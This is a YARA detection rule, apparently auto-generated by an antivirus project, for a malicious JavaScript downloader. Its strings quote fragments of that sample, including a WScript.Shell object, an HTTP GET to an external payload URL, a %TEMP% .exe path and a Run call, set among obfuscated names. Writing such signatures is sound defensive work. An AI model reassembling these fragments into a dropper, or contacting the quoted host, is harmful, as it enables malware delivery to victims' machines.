rule sig_20160328_f6b4d3ff63975a6c0204fa362a83856f {
  meta:
    description = "datamaliciousorder - file 20160328_f6b4d3ff63975a6c0204fa362a83856f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "775bd49acc477044eb1a40925e1c24eabee2f1d610e5393590224ee3ead7dfb1"

  strings:
    $s1  = "function Jdtsnmk() {return Rcnhcgzyrz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"sUcwuOseOqD.exe\";};" fullword ascii
    $s2  = "do {WScript[Xuzzig](Rvpnwwy() * 11)} while (Znsgruson[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Nckhzsjuvs(Haigyeneyl, Metkpu){return Haigyeneyl - Metkpu;};" fullword ascii
    $s4  = "var Rcnhcgzyrz = function Unkrczyahc() {return WScript[Gbqjjv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Znsgruson[Lkkccjhuzs](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s6  = "function Njgrbuzxu(Xyxshceb){Rcnhcgzyrz[\"Run\"](Xyxshceb, Scubtaclsx, Scubtaclsx);};" fullword ascii
    $s7  = "function Cxnjgj() {return ((Pauomuw == true) && (Pauomuw == Zwsdazg)) ? 1 : Scubtaclsx;};" fullword ascii
    $s8  = "Zwsdazg = true; " fullword ascii
    $s9  = "var Lzfnr = false;" fullword ascii
    $s10 = "function Yisiiof()" fullword ascii
    $s11 = "return Nckhzsjuvs(Fnngwvo, Mwuubyngx);" fullword ascii
    $s12 = "var Pauomuw = false;" fullword ascii
    $s13 = "function Wjpyxqytrb(){return Gbqjjv;};" fullword ascii
    $s14 = "function Rvpnwwy(){return 22;};" fullword ascii
    $s15 = "function Brznd(Lzveqjy) {var Unodhpfu = (1, 2, 3, 4, 5, Lzveqjy); return Unodhpfu;};" fullword ascii
    $s16 = "function Ykngibp(){return Iyhmqs;};" fullword ascii
    $s17 = "var Zwsdazg = false;" fullword ascii
    $s18 = " while (Fsoperqb){" fullword ascii
    $s19 = "Pauomuw = true; " fullword ascii
    $s20 = "var Nyaazu = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}